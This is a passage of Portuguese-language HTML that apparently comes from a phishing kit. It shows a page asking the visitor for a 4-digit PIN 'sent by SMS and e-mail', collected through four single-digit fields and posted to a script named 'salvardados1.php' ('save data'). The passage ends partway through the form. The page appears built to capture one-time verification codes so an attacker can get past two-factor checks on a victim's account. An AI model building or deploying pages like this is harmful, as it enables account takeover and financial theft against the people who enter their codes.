...
<body style="background:rgb(248, 248, 248);">
    ...
    <div style="width:90%;height:auto;margin:0 auto;padding:8px;">
        <p style="font-size:20px;">Para continuar, digite o código PIN <br> que enviamos por SMS e <br> e-mail</p>
        <p style="margin-top:15px;">O código tem 4 dígitos e vale por 5 minutos</p>
        <br><br>
        <form id="form" method="post" action="salvardados1.php" autocomplete="off">
            <center>
                <div class="sdasdsd1">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="pin1" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">

                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="pin2" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="pin3" onkeypress="startTabCheck();return onlynumber();" onkeyup="exibeValor(this, 1, 0)" onfocus="stopTabCheck(this)">
                    
                    <input type="tel"  style="width:43px;height:50px;border:none;outline:none;border-bottom:solid 2px rgb(77, 77, 77);font-size: 30px;background:transparent;text-align:center;margin-left:5px;" maxlength="1" minlength="1" autofocus="" autocomplete="" required="" name="pin4" onkeypress="return onlynumber();">
